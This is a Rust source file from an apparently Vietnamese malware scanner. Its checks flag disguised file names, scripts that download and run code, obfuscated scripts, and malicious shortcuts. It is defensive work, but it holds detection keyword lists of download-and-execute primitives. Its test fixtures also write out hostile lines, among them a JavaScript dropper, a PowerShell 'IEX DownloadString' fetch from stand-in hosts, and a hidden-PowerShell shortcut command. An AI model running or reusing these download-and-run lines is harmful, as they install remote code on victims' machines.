//! Built-in checks for how malware reaches people (ADR 0004, layer 3): scripts, shortcuts,
//! internet shortcuts and disguised names. None needs a rule pack.
//!
//! Every check here asks for a *combination* (download and run, hidden and run, a script host and
//! a web address), never one keyword, because ordinary admin scripts and shortcuts are common in
//! Downloads and on USB sticks. All findings are "suspicious": the user is asked, nothing is moved
//! on these alone, until the detection report shows them free of false positives (layer 5).

use crate::rules::Severity;
use crate::Finding;

/// Script types read as text.
const SCRIPT_EXT: &[&str] = &["js", "jse", "vbs", "vbe", "wsf", "wsh", "hta", "ps1", "psm1", "bat", "cmd"];
/// Extensions that run code when opened.
const RUNS_EXT: &[&str] = &[
    "exe", "scr", "com", "pif", "cpl", "bat", "cmd", "js", "jse", "vbs", "vbe", "wsf", "hta", "msi", "lnk", "ps1", "jar",
];
/// Extensions people expect to be documents or media.
const LOOKS_SAFE_EXT: &[&str] = &[
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "rtf", "jpg", "jpeg", "png", "gif", "mp3", "mp4", "zip", "rar",
];
/// Programs that run scripts or commands for a shortcut or a script.
const SCRIPT_HOSTS: &[&str] = &[
    "powershell", "pwsh", "cmd.exe", "mshta", "wscript", "cscript", "rundll32", "regsvr32", "certutil", "bitsadmin", "msiexec",
    "forfiles", "conhost", "curl.exe",
];
/// How scripts fetch something from the internet.
const DOWNLOADS: &[&str] = &[
    "downloadstring", "downloadfile", "downloaddata", "invoke-webrequest", "invoke-restmethod", "iwr ", "start-bitstransfer",
    "bitsadmin", "-urlcache", "msxml2.xmlhttp", "msxml2.serverxmlhttp", "winhttp.winhttprequest", "microsoft.xmlhttp",
    "net.webclient", "urldownloadtofile", "adodb.stream", "curl ", "curl.exe", "wget ",
];
/// How scripts start something else.
const RUNS: &[&str] = &[
    "wscript.shell", "shell.application", "shellexecute", "start-process", "invoke-expression", "iex(", "iex ", "| iex", "|iex",
    "mshta", "rundll32", "regsvr32", "cmd /c", "cmd.exe /c", ".exec(", "eval(", "execute(", "executeglobal", "-encodedcommand",
    "-enc ", "-e ", "start \"\"", "start /b",
];

fn finding(rule: &str, family: &str, vi: &str, en: &str) -> Finding {
    Finding {
        rule: rule.into(),
        family: family.into(),
        severity: Severity::Suspicious,
        message_vi: vi.into(),
        message_en: Some(en.into()),
        auto_quarantine: false,
    }
}

fn ext_of(name: &str) -> String {
    name.rsplit_once('.').map(|(_, e)| e.trim().to_ascii_lowercase()).unwrap_or_default()
}

fn has_web_address(s: &str) -> bool {
    s.contains("http://") || s.contains("https://") || s.contains("ftp://")
}

/// Disguised names: a document extension right before a program extension (`baocao.pdf.exe`,
/// also with spaces in between), and the right-to-left override that flips how a name reads.
pub fn name_findings(name: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    if name.chars().any(|c| matches!(c, '\u{202E}' | '\u{202D}' | '\u{202B}' | '\u{2067}' | '\u{2068}')) {
        out.push(finding(
            "builtin.name_rtl_trick",
            "disguise",
            "Tên tệp có ký tự đảo chiều để giả làm tài liệu: đây là chương trình, đừng mở.",
            "The file name uses a right-to-left character to look like a document: it is a program, do not open it.",
        ));
    }
    let lower = name.to_ascii_lowercase();
    let mut parts = lower.rsplit('.');
    let last = parts.next().unwrap_or("").trim();
    let before = parts.next().map(str::trim).unwrap_or("");
    let more = parts.next().is_some(); // at least name.doc.exe
    if more && RUNS_EXT.contains(&last) && LOOKS_SAFE_EXT.contains(&before) {
        out.push(finding(
            "builtin.name_double_extension",
            "disguise",
            "Tên tệp giả làm tài liệu nhưng thật ra là chương trình (đuôi kép): đừng mở.",
            "The file name pretends to be a document but it is a program (double extension): do not open it.",
        ));
    }
    out
}

/// Script files (by extension): fetching something and running it, or hiding code and running it.
pub fn script_findings(name: &str, bytes: &[u8]) -> Vec<Finding> {
    let ext = ext_of(name);
    if !SCRIPT_EXT.contains(&ext.as_str()) {
        return Vec::new();
    }
    let head = &bytes[..bytes.len().min(2 * 1024 * 1024)];
    let text = decode_text(head).to_ascii_lowercase();
    let runs = RUNS.iter().any(|k| text.contains(k));
    if !runs {
        return Vec::new();
    }
    let mut out = Vec::new();
    let downloads = has_web_address(&text) && DOWNLOADS.iter().any(|k| text.contains(k));
    if downloads {
        out.push(finding(
            "builtin.script_download_run",
            "script",
            "Script tải chương trình từ Internet rồi chạy: cách mã độc hay dùng để cài vào máy.",
            "The script downloads a program from the internet and runs it: a common way malware installs itself.",
        ));
    } else if obfuscated(&text) {
        out.push(finding(
            "builtin.script_obfuscated_run",
            "script",
            "Script giấu mã rồi chạy: tệp bình thường không cần làm vậy.",
            "The script hides its code and then runs it: ordinary files have no reason to.",
        ));
    }
    out
}

/// Hidden code: a long base64 run with a decoder, or code assembled from hundreds of characters.
fn obfuscated(text: &str) -> bool {
    let decoder = ["frombase64string", "atob(", "-encodedcommand", "base64decode", "certutil -decode"].iter().any(|k| text.contains(k))
        || text.contains("-enc ");
    let mut run = 0usize;
    let mut longest = 0usize;
    for b in text.bytes() {
        if b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=' {
            run += 1;
            longest = longest.max(run);
        } else {
            run = 0;
        }
    }
    let char_codes = text.matches("chr(").count() + text.matches("chrw(").count() >= 80 || text.matches("fromcharcode").count() >= 20;
    (decoder && longest >= 400) || char_codes
}

/// Text as a script engine would read it: UTF-16 (with a byte-order mark) or bytes as Latin-1.
fn decode_text(b: &[u8]) -> String {
    let utf16 = |rest: &[u8], le: bool| {
        let units: Vec<u16> = rest.as_chunks::<2>().0.iter().map(|c| if le { u16::from_le_bytes(*c) } else { u16::from_be_bytes(*c) }).collect();
        String::from_utf16_lossy(&units)
    };
    if let Some(rest) = b.strip_prefix(&[0xFF, 0xFE]) {
        return utf16(rest, true);
    }
    if let Some(rest) = b.strip_prefix(&[0xFE, 0xFF]) {
        return utf16(rest, false);
    }
    b.iter().map(|&c| c as char).collect()
}

/// Internet shortcuts (.url) that open a program from a network share or another computer.
pub fn url_findings(name: &str, bytes: &[u8]) -> Vec<Finding> {
    if ext_of(name) != "url" {
        return Vec::new();
    }
    let text = decode_text(&bytes[..bytes.len().min(64 * 1024)]).to_ascii_lowercase();
    let Some(url) = text.lines().find_map(|l| l.trim().strip_prefix("url=")) else { return Vec::new() };
    let url = url.trim();
    let remote_place = url.starts_with("file://") || url.starts_with("\\\\") || url.starts_with("search-ms:") || url.starts_with("smb:");
    let program = RUNS_EXT.iter().any(|e| url.trim_end_matches(['/', '"']).ends_with(&format!(".{e}")));
    if (remote_place && (program || url.starts_with("search-ms:"))) || (url.starts_with("http") && program && url.contains("webdav")) {
        return vec![finding(
            "builtin.url_remote_program",
            "shortcut",
            "Lối tắt Internet mở một chương trình từ máy khác: cách mã độc hay dùng để chạy.",
            "This internet shortcut opens a program from another computer: a common way to start malware.",
        )];
    }
    Vec::new()
}

// ---- Windows shortcuts (.lnk), [MS-SHLLINK] ----

const LNK_CLSID: [u8; 16] = [0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46];

/// What a shortcut runs: the target as far as it can be read, and its arguments.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct Lnk {
    pub target: String,
    pub arguments: String,
}

/// Reads a .lnk file (whatever its name): the target path (from LinkInfo, the relative path and
/// the names in the ID list) and the command-line arguments. `None` if it is not a shell link.
pub fn parse_lnk(b: &[u8]) -> Option<Lnk> {
    if b.len() < 76 || b[0..4] != [0x4C, 0, 0, 0] || b[4..20] != LNK_CLSID {
        return None;
    }
    let u16_at = |p: usize| b.get(p..p + 2).map(|s| u16::from_le_bytes([s[0], s[1]]) as usize);
    let u32_at = |p: usize| b.get(p..p + 4).map(|s| u32::from_le_bytes([s[0], s[1], s[2], s[3]]) as usize);
    let flags = u32_at(0x14)?;
    let unicode = flags & 0x80 != 0;
    let mut pos = 76usize;
    let mut target = String::new();
    if flags & 0x01 != 0 {
        let size = u16_at(pos)?;
        let idlist = b.get(pos + 2..pos + 2 + size)?;
        target.push_str(&printable_runs(idlist));
        pos += 2 + size;
    }
    if flags & 0x02 != 0 {
        let size = u32_at(pos)?;
        let info = b.get(pos..pos + size)?;
        if info.len() >= 28 && u32_at(pos + 8)? & 1 != 0 {
            let off = u32_at(pos + 16)?;
            if let Some(s) = info.get(off..) {
                let end = s.iter().position(|&c| c == 0).unwrap_or(s.len());
                target.push(' ');
                target.push_str(&s[..end].iter().map(|&c| c as char).collect::<String>());
            }
        }
        pos += size;
    }
    let mut strings = Vec::new();
    for bit in [0x04, 0x08, 0x10, 0x20, 0x40] {
        if flags & bit == 0 {
            strings.push(String::new());
            continue;
        }
        let count = u16_at(pos)?;
        pos += 2;
        let s = if unicode {
            let raw = b.get(pos..pos + count * 2)?;
            pos += count * 2;
            String::from_utf16_lossy(&raw.as_chunks::<2>().0.iter().map(|c| u16::from_le_bytes(*c)).collect::<Vec<_>>())
        } else {
            let raw = b.get(pos..pos + count)?;
            pos += count;
            raw.iter().map(|&c| c as char).collect()
        };
        strings.push(s);
    }
    // NAME, RELATIVE_PATH, WORKING_DIR, ARGUMENTS, ICON_LOCATION
    target.push(' ');
    target.push_str(&strings[1]);
    Some(Lnk { target: target.trim().to_string(), arguments: strings[3].clone() })
}

/// ASCII and UTF-16LE runs of 4+ printable characters: the names an ID list carries.
fn printable_runs(b: &[u8]) -> String {
    let mut out = String::new();
    let mut cur = String::new();
    let flush = |cur: &mut String, out: &mut String| {
        if cur.len() >= 4 {
            out.push_str(cur);
            out.push(' ');
        }
        cur.clear();
    };
    for &c in b {
        if (0x20..0x7F).contains(&c) {
            cur.push(c as char);
        } else {
            flush(&mut cur, &mut out);
        }
    }
    flush(&mut cur, &mut out);
    for c in b.as_chunks::<2>().0 {
        let u = u16::from_le_bytes(*c);
        if (0x20..0x7F).contains(&u) {
            cur.push(u as u8 as char);
        } else {
            flush(&mut cur, &mut out);
        }
    }
    flush(&mut cur, &mut out);
    out
}

/// A shortcut that starts a script host with a web address, hidden or encoded commands, or a very
/// long command line: how USB worms and phishing shortcuts start their payload.
pub fn lnk_findings(bytes: &[u8]) -> Vec<Finding> {
    let Some(l) = parse_lnk(bytes) else { return Vec::new() };
    let target = l.target.to_ascii_lowercase();
    let args = l.arguments.to_ascii_lowercase();
    let host = SCRIPT_HOSTS.iter().any(|h| target.contains(h) || args.starts_with(h));
    if !host {
        return Vec::new();
    }
    let sneaky = has_web_address(&args)
        || ["-enc", "-encodedcommand", "-w hidden", "-windowstyle hidden", "-nop", "frombase64string", "iex", "invoke-expression", "downloadstring"]
            .iter()
            .any(|k| args.contains(k))
        || args.contains("javascript:")
        || args.contains("vbscript:")
        || args.len() > 400
        || (args.contains("start ") && args.contains(".exe") && args.contains("&"));
    if !sneaky {
        return Vec::new();
    }
    vec![finding(
        "builtin.lnk_runs_script",
        "shortcut",
        "Lối tắt này chạy lệnh ẩn (PowerShell, cmd, mshta…) thay vì mở tệp: cách sâu USB và tệp lừa đảo hay dùng.",
        "This shortcut runs a hidden command (PowerShell, cmd, mshta…) instead of opening a file: a trick USB worms and phishing files use.",
    )]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(v: Vec<Finding>) -> Vec<String> {
        v.into_iter().map(|f| f.rule).collect()
    }

    #[test]
    fn disguised_names() {
        assert_eq!(rules(name_findings("Bao cao quy 3.pdf.exe")), ["builtin.name_double_extension"]);
        assert_eq!(rules(name_findings("hoadon.docx      .scr")), ["builtin.name_double_extension"]);
        assert_eq!(rules(name_findings("anh\u{202E}gpj.exe")), ["builtin.name_rtl_trick"]);
        for ok in ["setup.exe", "jquery.min.js", "bao-cao.v2.docx", "tai-lieu.pdf", "archive.tar.gz", "photo.jpg.txt"] {
            assert!(name_findings(ok).is_empty(), "{ok}");
        }
    }

    #[test]
    fn scripts_need_download_and_run_or_hidden_code_and_run() {
        let dropper = br#"var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","http://203.0.113.9/a.exe");var s=WScript.CreateObject("WScript.Shell");s.Run("a.exe");"#;
        assert_eq!(rules(script_findings("hoadon.js", dropper)), ["builtin.script_download_run"]);
        let ps = b"IEX (New-Object Net.WebClient).DownloadString('https://x.example/p.ps1')";
        assert_eq!(rules(script_findings("a.ps1", ps)), ["builtin.script_download_run"]);
        let blob = format!("$s=[Convert]::FromBase64String('{}'); iex ([Text.Encoding]::UTF8.GetString($s))", "QUJD".repeat(200));
        assert_eq!(rules(script_findings("b.ps1", blob.as_bytes())), ["builtin.script_obfuscated_run"]);
        // Ordinary scripts: a backup batch file, a page script, a module that only downloads.
        let backup = b"@echo off\r\nxcopy C:\\Data D:\\Backup /E /Y\r\nstart \"\" notepad log.txt\r\n";
        assert!(script_findings("backup.bat", backup).is_empty());
        let page = b"document.getElementById('x').addEventListener('click', () => fetch('https://api.example/v1'))";
        assert!(script_findings("app.js", page).is_empty());
        let update = b"Invoke-WebRequest https://example.org/data.csv -OutFile data.csv";
        assert!(script_findings("update.ps1", update).is_empty(), "downloads but runs nothing");
        assert!(script_findings("notes.txt", dropper).is_empty(), "not a script type");
    }

    fn lnk(flags: u32, relative: &str, args: &str) -> Vec<u8> {
        let mut b = vec![0x4C, 0, 0, 0];
        b.extend(LNK_CLSID);
        b.extend((flags | 0x80).to_le_bytes());
        b.resize(76, 0);
        let mut put = |s: &str| {
            let u: Vec<u16> = s.encode_utf16().collect();
            b.extend((u.len() as u16).to_le_bytes());
            for c in u {
                b.extend(c.to_le_bytes());
            }
        };
        put(relative); // RELATIVE_PATH (0x08)
        put(args); // ARGUMENTS (0x20)
        b
    }

    #[test]
    fn shortcuts_that_run_hidden_commands() {
        let worm = lnk(0x08 | 0x20, "..\\..\\..\\Windows\\System32\\cmd.exe", "/c start wscript /e:vbs \"_\\x.dat\" & start explorer \"Tai lieu\"");
        let parsed = parse_lnk(&worm).unwrap();
        assert!(parsed.target.to_ascii_lowercase().contains("cmd.exe"));
        let ps = lnk(0x08 | 0x20, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-w hidden -nop -c iex(iwr http://x.example/a)");
        assert_eq!(rules(lnk_findings(&ps)), ["builtin.lnk_runs_script"]);
        // Ordinary shortcuts: an app, and PowerShell opened plainly.
        let app = lnk(0x08, "..\\Program Files\\Zalo\\Zalo.exe", "");
        assert!(lnk_findings(&app).is_empty());
        let plain = lnk(0x08 | 0x20, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-NoExit");
        assert!(lnk_findings(&plain).is_empty());
        assert!(parse_lnk(b"not a shortcut").is_none());
    }

    #[test]
    fn internet_shortcuts_to_remote_programs() {
        let bad = b"[InternetShortcut]\r\nURL=file://203.0.113.9/share/update.exe\r\n";
        assert_eq!(rules(url_findings("Hoa don.url", bad)), ["builtin.url_remote_program"]);
        let search = b"[InternetShortcut]\r\nURL=search-ms:query=hoa%20don&crumb=location:\\\\203.0.113.9\\share\r\n";
        assert_eq!(rules(url_findings("a.url", search)), ["builtin.url_remote_program"]);
        let ok = b"[InternetShortcut]\r\nURL=https://dichvucong.gov.vn/\r\n";
        assert!(url_findings("Dich vu cong.url", ok).is_empty());
    }
}
